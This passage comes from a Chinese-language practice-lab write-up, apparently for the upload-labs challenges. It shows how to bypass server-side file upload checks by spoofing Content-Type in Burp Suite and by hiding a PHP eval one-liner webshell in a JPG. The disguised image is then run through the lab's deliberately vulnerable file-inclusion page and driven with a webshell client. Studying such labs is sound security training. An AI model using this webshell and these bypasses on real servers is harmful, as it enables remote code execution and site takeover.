<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型;在最早的HTTP协议中,没有附加的数据类型信息.所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。<br>Content-type就是我们经常在 http请求头里 response header看到的那个<br>里面包含的就是MIME信息.<br>作者：<a href="https://www.jianshu.com/p/fb5d8f03c4ed" target="_blank" rel="noopener">王进喜许三多</a></p>
</blockquote>
<p>看来MIME就是在<code>HTTP</code>数据包中标明文件类型的一个参数.<br>举几个例子</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">后缀</th>
<th align="center">content-type</th>
</tr>
</thead>
<tbody><tr>
<td align="center">超文本标记语言</td>
<td align="center">.html</td>
<td align="center">text/html</td>
</tr>
<tr>
<td align="center">xml文档</td>
<td align="center">.xml</td>
<td align="center">text/xml</td>
</tr>
<tr>
<td align="center">XHTML文档</td>
<td align="center">.xhtml</td>
<td align="center">application/xhtml+xml</td>
</tr>
<tr>
<td align="center">普通文本</td>
<td align="center">.txt</td>
<td align="center">text/plain</td>
</tr>
<tr>
<td align="center">RTF文本</td>
<td align="center">.rtf</td>
<td align="center">application/rtf</td>
</tr>
<tr>
<td align="center">PDF文档</td>
<td align="center">.pdf</td>
<td align="center">application/pdf</td>
</tr>
<tr>
<td align="center">Microsoft Word文件</td>
<td align="center">.word</td>
<td align="center">application/msword</td>
</tr>
<tr>
<td align="center">PNG图像</td>
<td align="center">.png</td>
<td align="center">image/png</td>
</tr>
<tr>
<td align="center">GIF图形</td>
<td align="center">.gif</td>
<td align="center">image/gif</td>
</tr>
<tr>
<td align="center">JPEG图形</td>
<td align="center">.jpeg,.jpg</td>
<td align="center">image/jpeg</td>
</tr>
</tbody></table>
<p>看到是在服务器端进行判断就应该知道像上道题目中, 使用浏览器的手段应该是行不通的了, 要想办法骗过服务器. 在这里, 我们使用工具<code>Burp Suite</code>对需要上传的数据包进行修改.<br>具体步骤:<br>因为截图比较麻烦, 我就不放图了, 有需要可以自行百度.</p>
<ol>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能 intercept is on。</li>
<li>上传<code>test.php</code>的文件，提示文件类型不正确，请重新上传。</li>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能intercept is on。</li>
<li>chrome浏览器代理设置，<code>127.0.0.1:8080</code>,这里我使用的是<code>SwitchyOmega</code>插件进行快速设置。</li>
<li>重新选择<code>test.php</code>文件进行上传，<code>Burp Suite</code>拦截到文件上传数据包。(如果在本地部署靶场, <code>Burp Suite</code>可能会拦截不到数据包?)</li>
<li>将拦截数据包中的<code>content-type:application/octet-stream</code>更改为<code>content-type:image/jpeg</code>，点击<code>forward</code>转发。</li>
<li>查看上传网页界面，发现文件已经上传成功。</li>
</ol>
<h3 id="pass13"><a href="#pass13" class="headerlink" title="pass13:"></a>pass13:</h3><p>题目要求：</p>
<blockquote>
<p>上传图片马到服务器。<br>注意：<br>1.保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。<br>2.使用<code>文件包含漏洞</code>能运行图片马中的恶意代码。<br>3.图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</p>
</blockquote>
<p>好的，什么是<code>图片马</code>？<br>百度了下相关的概念和制作方法，其实说白了，图片马就是在图片文件中入恶意代码，但依然保持文件类型是图片格式（<code>.jpg</code>,<code>.png</code>,<code>.gif</code>等）的木马文件。<br>最简单的图片马当然就是在图片中插入<code>一句话</code>生成的,</p>
<p>制作方法很简单, 随便找个图片( 以<code>jpg</code>为例 ), 以记事本打开, 在末尾加上<code>一句话</code>的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并保存下来就制作好了. ( 在某篇博客中看到, 可以只保留原文件的前三行然后再加入代码, 因为有时图片过大会影响图片马的运行. )<br>也可以用cmd, 输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  1.jpg/b+2.php/a  3.jpg</span><br></pre></td></tr></table></figure>

<p><code>1.jpg</code> 是原图片文件, <code>2.php</code>是<code>一句话</code>, <code>3.jpg</code>就是两个文件合并后的新文件.<br><code>/b</code>是以二进制形式,适用于图片音频等文件<br><code>/a</code>是ascii形式,适用于<code>txt</code>,<code>php</code>等文本文件<br><font size="2" color="green">小声bb : 然而亲测好像没有什么区别</font></p>
<p>把合成好的文件放到测试的目录下, 尝试使用菜刀连接. </p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/jpg.png" alt title class>
                <p></p>
            </figure>
<p>.<br>.<br>.<br>会发现连接不上 :|</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/error.png" alt title class>
                <p></p>
            </figure>
<p>这是因为菜刀只能和<code>php</code>,<code>asp</code>,<code>aspx</code>等脚本文件连接. </p>
<p>如果把后缀改成<code>php</code>,再次连接…</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/php.png" alt title class>
                <p></p>
            </figure>

<p>可以发现正常工作. :)<br>但是这不足以解决这个题目.<br>因为题目只能提交<code>.jpg</code>等图片文件, 所以要用题目中的<code>文件包含漏洞</code>.<br>看下题目中提供的<code>include.php</code>的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>); </span><br><span class="line">$file = $_GET[<span class="string">'file'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123; </span><br><span class="line">    <span class="keyword">include</span> $file; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>感觉<code>GET()</code>函数应该是关键点<br>百度了下, <code>GET()</code>函数在这的使用方法是在URL处获取参数.<br>比如, 我在URL<code>http://某路径/include.php</code>后加上<code>?file=test.txt</code>, 也就是<code>http://某路径/include.php?file=test.txt</code>那么当我访问这个URL时, 脚本就会自动找到<code>test.txt</code>并把其内容放到当前<code>include.php</code>中一起执行.<br>这样,我们就可以通过<code>文件包含漏洞</code>, 使服务器在运行<code>include.php</code>时把我们的木马一起运行了.</p>
<p>在浏览器中测试下,</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/ceshi.png" alt title class>
                <p></p>
            </figure>
<p>可以发现, <code>图片马</code>的数据已经被访问到了.(但是没有发现<code>php脚本</code>回显, 暂时存疑 :/ )</p>
<p>在使用菜刀尝试连接</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/sucessful.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/C.png" alt title class>
                <p></p>
            </figure>
<p>成功拿到了 <code>webshell</code>,这道题到这就算是结束了, 其它的两个图片类型应该也都差不多, 这里不多赘述. :)</p>
<h4 id="顺便提一下"><a href="#顺便提一下" class="headerlink" title="顺便提一下"></a>顺便提一下</h4><p>每次用<code>一句话</code>或者用大马得到<code>webshell</code>后, 目录下就会发现有<code>$RECYCLE.BIN</code>和system volume information这俩个文件夹. 在这里贴下相关资料:<br><a href="https://blog.csdn.net/sinat_33718563/article/details/78837510" target="_blank" rel="noopener">rs勿忘初心</a>:</p>
<blockquote>
<p><code>$RECYCLE.BIN</code> :首先说明这是系统文件 不是病毒<code>$RECYCLE.BIN</code> 不是像一个回收站，它就是回收站！每个盘都有！你在每个盘删除的东西都会留在各自盘的回收站（即 <code>$RECYCLE.BIN</code>）里，而桌面上的就是总的回收站了。各自盘里的<code>$RECYCLE.BIN</code> 再你清空桌面上的回收站后也就自动清除了！</p>
</blockquote>
<p><a href>tangpeicheng</a>:</p>
<blockquote>
<p>system volume information:<br>其中文名称可以翻译为“系统卷标信息”。这个文件夹里就存储着系统还原的备份信息。这里涉及到“系统还原”,“系统还原”是Windows XP最实用的功能之一，它采用“快照”的方式记录下系统在特定时间的状态信息，也就是所谓的“还原点”，然后在需要的时候根据这些信息加以还原。</p>
</blockquote>
<h3 id="pass14"><a href="#pass14" class="headerlink" title="pass14:"></a>pass14:</h3><p>同pass13</p>
<h3 id="pass15"><a href="#pass15" class="headerlink" title="pass15:"></a>pass15:</h3><p>同pass14<br>虽然13，14，15可以用同样的方法过关.<br>但是我们不妨仔细的分析下代码, 体会区别</p>
<h4 id="pass14代码"><a href="#pass14代码" class="headerlink" title="pass14代码:"></a>pass14代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里先是定义了一个函数<br><code>isImage($filename)</code><br>这个函数的作用可以推测是判断文件是否为图片类型，如果是则返回具体类型(.jpg,.png,.git)，如果不是则返回 false. </p>
<p>这其中还有两个函数<code>getimagesize()</code>和<code>image_type_to_extension()</code><br>其中<code>getimagesize()</code>会以数组的形式返回图像的一组信息, 其第二个元素(<code>info[2]</code>)保存的是图片类型. 但是是以数字编码的形式(1,2,3…)保存, 所以需要使用<code>image_type_to_extension($info[2])</code>将数字转为字符串.</p>
<p>程序主体这里出现了几个php脚本预定义的常量</p>
<ul>
<li><code>$_POST</code>可以用来收集来自<code>method = &quot;post&quot;</code>的表单的数据. 表单域的名称会自动成为 <code>$_POST</code> 数组中的键. 所以这里的 <code>&#39;submit&#39;</code>应该是某个表单域的名称.<br>事实上, 通过在浏览器中使用开发者工具分析网页中表单代码:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这应该就是上述的表单, 用来收集上传文件的数据. 而服务器接受到表单的数据后会自动将其中的信息保存在<code>$_POST</code>数组中供脚本调用. </p>
<ul>
<li><p><code>$_FILES</code>POST产生的表单存储在 <code>$_POST</code>中,那么上传的文件的相关信息保存在<code>$_FILES</code>中.<br>其有两个下标.第一个是文件的<code>name</code>, 此处即为表单中的<code>upload_file</code>.第二个则是文件的某些具体参数可以是:”name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
<ul>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;name&quot;]</code> - 被上传文件的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;type&quot;]</code> - 被上传文件的类型</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;size&quot;]</code> - 被上传文件的大小，以字节计</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;]</code> - 存储在服务器的文件的临时副本的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;error&quot;]</code>- 由文件上传导致的错误代码<h4 id="pass15代码"><a href="#pass15代码" class="headerlink" title="pass15代码:"></a>pass15代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>其他部分大同小异,主要是<code>exif_imagetype(&amp;filename)</code>函数</p>
<blockquote>
<p>本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 <code>$_SERVER[&#39;HTTP_ACCEPT&#39;]</code> 结合使用来检查浏览器是否可以显示某个指定的图像。</p>
</blockquote>
<p>所以只是对第一个字节进行检测, 用pass13的方法即可绕过.</p>
]]></content>
      
        
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> php </tag>
            
            <tag> 一句话木马 </tag>
            
            <tag> 图片马 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
